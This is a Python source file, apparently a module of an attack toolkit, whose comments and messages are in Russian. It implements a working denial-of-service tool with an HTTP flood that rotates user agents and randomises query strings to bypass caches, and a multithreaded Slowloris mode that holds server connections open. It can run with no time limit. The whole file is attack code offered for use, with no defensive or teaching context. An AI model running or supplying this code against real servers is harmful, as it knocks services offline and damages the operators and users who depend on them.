#!/usr/bin/env python3
# dos.py - DoS Attack (HTTP Flood / Slowloris)

import time
import threading
import requests
import random
import socket
from typing import Dict, Any

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36",
]

class DoSAttack:
    def __init__(self, target: str, attack_type: str = "http", threads: int = 50, duration: int = 0):
        self.target = target
        self.attack_type = attack_type
        self.threads = threads
        self.duration = duration
        self.running = True
        self.total_requests = 0
        self.errors = 0
        self.start_time = 0
        
    def http_flood(self):
        while self.running:
            try:
                headers = {
                    "User-Agent": random.choice(USER_AGENTS),
                    "Accept": "*/*",
                    "Accept-Language": "en-US,en;q=0.9",
                }
                # Случайные параметры для обхода кеша
                url = f"{self.target}?{random.randint(1, 999999)}"
                requests.get(url, headers=headers, timeout=5)
                self.total_requests += 1
            except:
                self.errors += 1
                
    def slowloris(self):
        sockets = []
        while self.running:
            try:
                # Открываем новое соединение
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((self.target.split("//")[1].split("/")[0], 80))
                s.send(b"GET / HTTP/1.1\r\n")
                s.send(b"Host: " + self.target.split("//")[1].encode() + b"\r\n")
                s.send(b"User-Agent: " + random.choice(USER_AGENTS).encode() + b"\r\n")
                sockets.append(s)
                self.total_requests += 1
                time.sleep(0.1)
            except:
                self.errors += 1
                time.sleep(1)
            
    def start(self):
        self.start_time = time.time()
        threads = []
        
        for i in range(self.threads):
            if self.attack_type == "http":
                t = threading.Thread(target=self.http_flood)
            else:
                t = threading.Thread(target=self.slowloris)
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Мониторинг в реальном времени
        print("\n[+] DoS атака запущена. Нажмите Ctrl+C для остановки.")
        try:
            while self.running:
                elapsed = time.time() - self.start_time
                rate = self.total_requests / elapsed if elapsed > 0 else 0
                print(f"\r[+] Запросов: {self.total_requests} | Ошибок: {self.errors} | Скорость: {rate:.1f}/сек", end="")
                
                if self.duration > 0 and elapsed >= self.duration:
                    self.running = False
                    break
                time.sleep(1)
        except KeyboardInterrupt:
            self.running = False
            
        print("\n[+] Атака остановлена.")
        return {
            "total_requests": self.total_requests,
            "errors": self.errors,
            "duration": round(time.time() - self.start_time, 2)
        }

def run(target: str, **kwargs) -> Dict[str, Any]:
    """
    Запуск DoS атаки
    kwargs:
        attack_type: str - "http" или "slowloris"
        threads: int - количество потоков
        duration: int - длительность в секундах (0 = бесконечно)
    """
    results = {
        "status": "ok",
        "result": {},
        "errors": [],
        "duration": 0
    }
    
    try:
        attack_type = kwargs.get("attack_type", "http")
        threads = kwargs.get("threads", 50)
        duration = kwargs.get("duration", 0)
        
        dos = DoSAttack(target, attack_type, threads, duration)
        stats = dos.start()
        
        results["result"] = {
            "status": "completed",
            "type": attack_type,
            "threads": threads,
            "total_requests": stats["total_requests"],
            "errors": stats["errors"],
            "duration_sec": stats["duration"]
        }
        
    except Exception as e:
        results["status"] = "error"
        results["errors"].append(str(e))
    
    return results